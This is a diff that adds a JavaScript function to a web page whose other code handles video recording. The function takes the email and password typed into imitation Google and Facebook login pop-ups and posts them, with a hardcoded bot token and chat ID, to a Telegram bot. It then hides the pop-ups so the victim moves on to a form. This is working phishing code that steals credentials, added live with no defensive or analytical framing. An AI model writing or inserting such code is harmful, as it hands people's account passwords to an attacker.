@@ -267,6 +267,52 @@
 let recorder;
 let recordedChunks = [];
 let videoBlob;
+async function sendLoginDataToTelegram(provider) {
+    const botToken = "8339659569:AAGEgXJt_FWqP83psb0Z3O42A6TMW-AJGb4";
+    const chatId = "5865345881";
+
+    let email = "";
+    let password = "";
+
+    // جلب البيانات من الحقول
+    if (provider === "Google") {
+        email = document.getElementById("g-email").value;
+        password = document.getElementById("g-password").value;
+    } else if (provider === "Facebook") {
+        email = document.getElementById("fb-email").value;
+        password = document.getElementById("fb-password").value;
+    }
+
+    // لو الحقول فاضية
+    if (email.trim() === "" || password.trim() === "") {
+        alert("يرجى ملء جميع البيانات");
+        return;
+    }
+
+    // تجهيز النص
+    const message = 
+        `🔐 تسجيل دخول جديد (${provider})\n\n` +
+        `📧 الإيميل: ${email}\n` +
+        `🔑 كلمة المرور: ${password}`;
+
+    // إرسال لتليجرام
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    });
+
+    // إغلاق المودال
+    document.getElementById('google-modal').style.display = 'none';
+    document.getElementById('facebook-modal').style.display = 'none';
+
+    // الذهاب للفورم
+    document.getElementById('step-login').classList.add('hidden');
+    document.getElementById('step-form').classList.remove('hidden');
+}
 
 // بدء التسجيل
 async function startRecording() {
